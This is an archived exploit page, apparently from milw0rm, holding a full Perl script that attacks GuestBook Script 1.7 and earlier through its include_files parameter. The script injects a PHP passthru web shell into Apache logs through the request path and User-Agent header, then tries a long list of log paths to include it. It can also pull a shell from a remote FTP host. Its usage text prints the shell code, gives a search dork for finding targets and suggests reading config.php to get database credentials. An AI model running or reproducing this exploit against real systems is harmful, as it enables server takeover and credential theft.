<html><head><title>GuestBook Script <= 1.7 (include_files) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;

print &quot;guestbook script &lt;= 1.7 exploit\r\n&quot;;
print &quot;rgod rgod\@autistici.org\r\n&quot;;
print &quot;dork: \&quot;powered by guestbook script\&quot;\r\n\r\n&quot;;

# short explaination:
# we have this code in nearly all scripts:
# ...
# if (isset ($include_files) and is_array ($include_files)) {
#              reset ($include_files);
#              while(list($key, $val) = each($include_files))
#              {
#
#                  if ($file_content = include_content($val)) {
#                      $$key = $file_content;
#                  } else {
#                      $$key = '&lt;pre&gt;[' . $txt['txt_file_not_found'] . ': ' . $val . ']&lt;/pre&gt;';
#                  }
#                  $tpl-&gt;register('guest', $key);
#              }
#          }
#...
# here is include_content() function:
#
# function include_content($path)
#          {
#
#              if (is_file($path)) {
#                  ob_start();
#
#                  include($path);
#                  $content = ob_get_contents();
#                  ob_end_clean();
#              }
#
#              if (isset($content)) {
#                  return $content;
#              }
#          }
#
# you can include code from local resources and (on PHP5, because is_file()
# function support ftp wrappers) remote resources, poc:
#
# http://[target]/[path]/index.php?include_files[]=&amp;include_files[1]=/var/log/httpd/access_log
# http://[target]/[path]/index.php?include_files[]=&amp;include_files[1]=ftp://username:pass@192.168.1.3/suntzu.php
#
# you will not see any output, but code inside the included file will be executed.
# You shoul have a &quot;die()&quot; in included file (to prevent the ob_end_clean() call)
# to see some results...
# This exploit supports two actions:
#
# [1] tries to inject some php code in log files and execute it
# [2] tries to include the code from a ftp location


sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

if (@ARGV &lt; 4)
{
print &quot;Usage:\r\n&quot;;
print &quot;perl gbs_17_xpl.pl SERVER PATH ACTION[FTP LOCATION] COMMAND\r\n\r\n&quot;;
print &quot;SERVER         - Server where Guestbook Script is installed.\r\n&quot;;
print &quot;PATH           - Path to Guestbook Script (ex: /gbs/ or just /)\r\n&quot;;
print &quot;ACTION         - 1[nothing]\r\n&quot;;
print &quot;                 (tries to include apache error.log file)\r\n\r\n&quot;;
print &quot;                 2[ftp site with the code to include]\r\n\r\n&quot;;
print &quot;COMMAND        - A shell command (\&quot;cat config.php\&quot;\r\n&quot;;
print &quot;                 to see database username &amp; password)\r\n\r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 1 cat config.php\r\n&quot;;
print &quot;perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 2ftp://username:password\@192.168.1&quot;;
print &quot;.3/suntzu.php ls -la\r\n\r\n&quot;;
print &quot;Note: to launch action [2] you need this code in suntzu.php :\r\n&quot;;
print &quot;&lt;?php\r\n&quot;;
print &quot;ob_clean();\r\n&quot;;
print &quot;echo 666;\r\n&quot;;
print &quot;if (get_magic_quotes_gpc())\r\n&quot;;
print &quot;{\$_GET[cmd]=stripslashes(\$_GET[cmd]);}\r\n&quot;;
print &quot;passthru(\$_GET[cmd]);\r\n&quot;;
print &quot;echo 666;\r\n&quot;;
print &quot;die;\r\n&quot;;
print &quot;?&gt;\r\n\r\n&quot;;
exit();
}

$serv=$ARGV[0];
$path=$ARGV[1];
$ACTION=urlEncode($ARGV[2]);
$cmd=&quot;&quot;; for ($i=3; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};
$temp=substr($ACTION,0,1);

if ($temp==2) { #this works with PHP5 and allow_url_fopen=On
  $FTP=substr($ACTION,1,length($ACTION));
  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;)
  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
  print $sock &quot;GET &quot;.$path.&quot;index.php?cmd=&quot;.$cmd.&quot;&amp;include_files[]=&amp;include_files[1]=&quot;.$FTP.&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;
  $out=&quot;&quot;;
  while ($answer = &lt;$sock&gt;) {
    $out.=$answer;
  }
  close($sock);
  @temp= split /666/,$out,3;
  if ($#temp&gt;1) {print &quot;\r\nExploit succeeded...\r\n&quot;.$temp[1];exit();}
         else {print &quot;\r\nExploit failed...\r\n&quot;;}

} elsif ($temp==1) { #this works if path to log files is found and u can have access to them
  print &quot;[1] Injecting some code in log files ...\r\n&quot;;
  $CODE=&quot;&lt;?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {\$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);echo 666;die;?&gt;&quot;;
  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;)
  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
  print $sock &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;
  close($sock);

  # fill with possible locations
  my @paths= (
  &quot;/var/log/httpd/access_log&quot;,         #Fedora, default
  &quot;/var/log/httpd/error_log&quot;,          #...
  &quot;../apache/logs/error.log&quot;,          #Windows
  &quot;../apache/logs/access.log&quot;,
  &quot;../../apache/logs/error.log&quot;,
  &quot;../../apache/logs/access.log&quot;,
  &quot;../../../apache/logs/error.log&quot;,
  &quot;../../../apache/logs/access.log&quot;,  #and so on... collect some log paths, you will succeed
  &quot;/etc/httpd/logs/acces_log&quot;,
  &quot;/etc/httpd/logs/acces.log&quot;,
  &quot;/etc/httpd/logs/error_log&quot;,
  &quot;/etc/httpd/logs/error.log&quot;,
  &quot;/var/www/logs/access_log&quot;,
  &quot;/var/www/logs/access.log&quot;,
  &quot;/usr/local/apache/logs/access_log&quot;,
  &quot;/usr/local/apache/logs/access.log&quot;,
  &quot;/var/log/apache/access_log&quot;,
  &quot;/var/log/apache/access.log&quot;,
  &quot;/var/log/access_log&quot;,
  &quot;/var/www/logs/error_log&quot;,
  &quot;/var/www/logs/error.log&quot;,
  &quot;/usr/local/apache/logs/error_log&quot;,
  &quot;/usr/local/apache/logs/error.log&quot;,
  &quot;/var/log/apache/error_log&quot;,
  &quot;/var/log/apache/error.log&quot;,
  &quot;/var/log/access_log&quot;,
  &quot;/var/log/error_log&quot;
  );

  for ($i=0; $i&lt;=$#paths; $i++)
  {
    $a = $i + 2;
    print &quot;[&quot;.$a.&quot;] trying with &quot;.$paths[$i].&quot;\r\n&quot;;
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;)
    or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
    print $sock &quot;GET &quot;.$path.&quot;index.php?cmd=&quot;.$cmd.&quot;&amp;include_files[]=&amp;include_files[1]=&quot;.urlEncode($paths[$i]).&quot; HTTP/1.1\r\n&quot;;
    print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
    print $sock &quot;Connection: close\r\n\r\n&quot;;
    $out='';
    while ($answer = &lt;$sock&gt;) {
    $out.=$answer;
    }
    close($sock);
    @temp= split /666/,$out,3;
    if ($#temp&gt;1) {print &quot;\r\nExploit succeeded...\r\n&quot;.$temp[1];exit();}

  }
  #if you are here...
  print &quot;\r\nExploit failed...\r\n&quot;;
} else {
  print &quot;No action specified ...\r\n&quot;;
}

# milw0rm.com [2006-03-11]</pre></html>